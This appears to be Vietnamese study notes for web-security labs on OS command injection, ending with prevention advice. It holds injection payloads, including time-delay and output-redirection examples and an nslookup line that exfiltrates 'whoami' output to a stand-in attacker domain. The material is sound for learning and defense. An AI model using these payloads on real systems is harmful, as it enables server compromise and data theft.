# OS command injection

## What is OS command injection?

- OS command injection (shell injection) là một lỗ hổng web cho phép thực thi tùy ý các lệnh của hệ điều hành trên máy chủ và thường xâm phạm hoàn toàn ứng dụng và máy chủ của nó.

## Executing arbitrary commands.

- Một web hiển thị thông tin mặt hàng qua URL:
```https://insecure-website.com/stockStatus?productID=381&storeID=29```

- Dữ liệu được truyền qua các param sẽ được xử lí bằng câu lệnh : ```stockreport.pl 381 29```

- Ta chi cần truyền vào param *productID* giá trị *& echo xyz &* => câu lệnh xử lí sẽ chuyển thành ```stockreport.pl & echo xyz & 29``` => xyz được in ra nhờ lệnh echo .

- Lab:
	+ Lab: OS command injection, simple case.[exploit](exploit/lab1.py)

## Useful commands.

|Purpose of command	  | Linux	    | Windows       |
|:--------------------|:------------|:--------------|
|Name of current user | whoami	    | whoami        |
|Operating system	  | uname -a	| ver           |
|Network configuration|	ifconfig	| ipconfig /all |
|Network connections  | netstat -an	| netstat -an   |
|Running processes	  | ps -ef	    | tasklist      |

## Blind OS command injection vulnerabilities.

- Nhiều trường hợp tiêm lệnh hệ điều hành là lỗ hổng bảo mật. Điều này có nghĩa là ứng dụng không trả về kết quả đầu ra từ lệnh trong phản hồi HTTP của nó. Các lỗ hổng bảo mật vẫn có thể được khai thác, nhưng cần phải có các kỹ thuật khác nhau.

### Detecting blind OS command injection using time delays.

- Bạn có thể sử dụng một lệnh được đưa vào sẽ kích hoạt độ trễ thời gian, cho phép bạn xác nhận rằng lệnh đã được thực thi dựa trên thời gian ứng dụng cần để phản hồi .

- VD: *& ping -c 10 8.8.8.8 &*

- Lab:
	+ Lab: Blind OS command injection with time delays.[exploit](exploit/lab2.py)

### Exploiting blind OS command injection by redirecting outp.

- Bạn có thể chuyển hướng đầu ra từ lệnh được đưa vào thành một tệp trong thư mục gốc mà sau đó bạn có thể truy xuất bằng trình duyệt của mình.

```& whoami > /var/www/static/whoami.txt &```

- Lab:
	+ Lab: Blind OS command injection with output redirection.[exploit](exploit/lab3.py)

### Exploiting blind OS command injection using out-of-band (OAST) techniques.

- Bạn có thể sử dụng một lệnh để kích hoạt tương tác mạng ngoài băng tần với hệ thống mà bạn kiểm soát, sử dụng các kỹ thuật OAST.

```& nslookup kgji2ohoyw.web-attacker.com &```
or
```& nslookup `whoami`.kgji2ohoyw.web-attacker.com &```

- Lab :
	+ Lab: Blind OS command injection with out-of-band interaction.[exploit](exploit/lab4.py)
	+ Lab: Blind OS command injection with out-of-band data exfiltration.[exploit](exploit/lab5.py)

## Ways of injecting OS commands.

- Một số ký tự có chức năng như dấu phân cách lệnh, cho phép các lệnh được xâu chuỗi lại với nhau.

	+ Win and Unix : && , &, || , |
	+ Unix : ; , 0x0a , \n
	+ Thực thi shell unix : *`command`* , *${command}*

## How to prevent OS command injection attacks.

- Không nên dùng các lệnh hệ thống để xử lí các hành vi trên ứng dụng . Trong trường hợp cần sử dụng thì cần phải áp dụng các chính sách sau :

	+ Xác thực dựa trên danh sách trắng các giá trị được phép.
	+ Xác thực rằng đầu vào là một số.
	+ Xác thực rằng đầu vào chỉ chứa các ký tự chữ và số, không có cú pháp hoặc khoảng trắng nào khác.